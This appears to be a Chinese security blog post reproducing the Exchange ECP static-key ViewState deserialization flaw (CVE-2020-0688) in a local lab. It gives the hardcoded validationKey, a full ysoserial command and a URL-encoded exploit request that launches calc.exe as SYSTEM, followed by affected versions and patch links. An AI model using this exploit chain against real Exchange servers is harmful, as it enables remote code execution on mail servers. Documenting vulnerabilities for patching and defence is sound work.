**近期爆出Exchange邮件服务器远程执行命令漏洞,对其进行了分析并在本地进行了复现，其中也遇到了一些问题。**

## 漏洞原理

漏洞产生的主要原因就是在Exchange
ECP组件中发现，邮件服务在安装的过程中不会随机生成秘钥，也就是说所有默认安装的Exchange服务器中的validationKey和decryptionKey的值都是相同的，攻击者可以利用静态秘钥对服务器发起攻击，在服务器中以SYSTEM权限远程执行代码。

## 漏洞利用工具

目前github中已经有利用poc脚本：[POC1](https://github.com/Jumbo-WJB/CVE-2020-0688),[POC2](https://github.com/random-robbie/cve-2020-0688)，脚本的实现原理基本相同，其中都需要用到ysoserial.exe对payload进行反序列化。

## 复现过程

首先我在本地搭建的是Exchange Server2016，对于如何识别版本可以用如下的方式：

在登录界面查看网页源代码：

![](https://image.3001.net/images/20200228/1582874237_5e58be7debb6b.png!small)

找到<link rel="shortcut icon"
href="/owa/auth/15.1.225/themes/resources/favicon.ico" type="image/x-icon">

其中15.1.225就是当前exchange的版本，之后在[Mircosoft网站](https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019)上根据版本号就可以直接查询：

![](https://image.3001.net/images/20200228/1582874257_5e58be9130456.png!small)

前面说到validationKey和decryptionKey的值都是相同，可以再安装好的服务中找到web.config文件查看：

![](https://image.3001.net/images/20200228/1582874265_5e58be997e625.png!small)

这样一来的话我们还需要找到另外两个值：generator和viewstateuserkey，可以通过一个普通账号登录[https://ip](https://ip/)/ecp/default.aspx来寻找这两个值。

generator位于default.aspx-->Response-->__VIEWSTATEGENERATOR中，这个值也基本上是相同的：B97B4E27:

![](https://image.3001.net/images/20200228/1582874273_5e58bea1385cc.png!small)

viewstateuserkey位于default.aspx-->Headers-->ASP.NET_SessionId中：

![](https://image.3001.net/images/20200228/1582874278_5e58bea608b97.png!small)

有了这几个值的话就可以构造payload了。利用ysoserial生成反序列化（--isdebug –islegacy可省略）：

  

`ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c
calc.exe" --validationalg="SHA1"
--validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF"
--generator="B97B4E27" --viewstateuserkey="加上ASP.NET_SessionId的值" --isdebug
–islegacy`

![](https://image.3001.net/images/20200228/1582874284_5e58beacdcec5.png!small)

把生成的反序列化结果URL编码后访问：/ecp/default.aspx?__VIEWSTATEGENERATOR=<generator>&__VIEWSTATE=<ViewState>

    
    
    https://ip/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTAT
    E=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVk
    aXRvciwgVmVyc2lvbj0zLjAuM**wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYz
    ODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuR**ybWF0dGluZy5UZXh0
    R**ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVnc**1bmRCcnVzaAECAAAABgMAAACmBDxSZXNv
    dXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngv
    MjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljc**zb2Z0
    LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07
    YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdu
    b3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2
    JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2B
    DQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3Rl
    bTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3Zp
    ZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291
    cmNlRGljdGlvbmFyeT4LzN2Z9QtEAJ0ld64eNnVltj7dajY%3D  
    

访问后服务器返回500，可以在服务器端查看执行结果：

![](https://image.3001.net/images/20200228/1582874346_5e58beead909e.png!small)

可以在管理器中看到以system权限开启的计算器

在执行python脚本时需要在python3环境下，原脚本中需要自己手动输入反序列化结果，建议在脚本中直接调用cmd执行反序列化操作。

## 影响版本

影响所有版本的Exchang Server：

> Microsoft Exchange Server 2010 Service Pack 3
>
> Microsoft Exchange Server 2013
>
> Microsoft Exchange Server 2016
>
> Microsoft Exchange Server 2019

## 防护措施

补丁下载

> Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30
> [KB4536989](https://www.freebuf.com/wp-> admin/post.php?id=100910%20Microsoft%20Exchange%20Server%202013%20Cumulative%20Update%2023%20KB4536988%20https://www.microsoft.com/zh-> CN/download/details.aspx?id=100909%20Microsoft%20Exchange%20Server%202016%20Cumulative%20Update%2014%20KB4536987%20https://www.microsoft.com/zh-> CN/download/details.aspx?id=100907%20Microsoft%20Exchange%20Server%202016%20Cumulative%20Update%2015%20KB4536987%20https://www.microsoft.com/zh-> CN/download/details.aspx?id=100908%20Microsoft%20Exchange%20Server%202019%20Cumulative%20Update%203%20KB4536987%20https://www.microsoft.com/en-> us/download/details.aspx?id=100905%20Microsoft%20Exchange%20Server%202019%20Cumulative%20Update%204%20KB4536987%20https://www.microsoft.com/zh-> CN/download/details.aspx?id=100906)
>
> Microsoft Exchange Server 2013 Cumulative Update 23
> [KB4536988](https://www.microsoft.com/zh-CN/download/details.aspx?id=100909)
>
> Microsoft Exchange Server 2016 Cumulative Update 14
> [KB4536987](https://www.microsoft.com/zh-CN/download/details.aspx?id=100907)
>
> Microsoft Exchange Server 2016 Cumulative Update 15
> [KB4536987](https://www.microsoft.com/zh-CN/download/details.aspx?id=100908)
>
> Microsoft Exchange Server 2019 Cumulative Update 3
> [KB4536987](https://www.microsoft.com/en-us/download/details.aspx?id=100905)
>
> Microsoft Exchange Server 2019 Cumulative Update 4
> [KB4536987](https://www.microsoft.com/zh-CN/download/details.aspx?id=100906)

***本文原创作者：Kriston，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

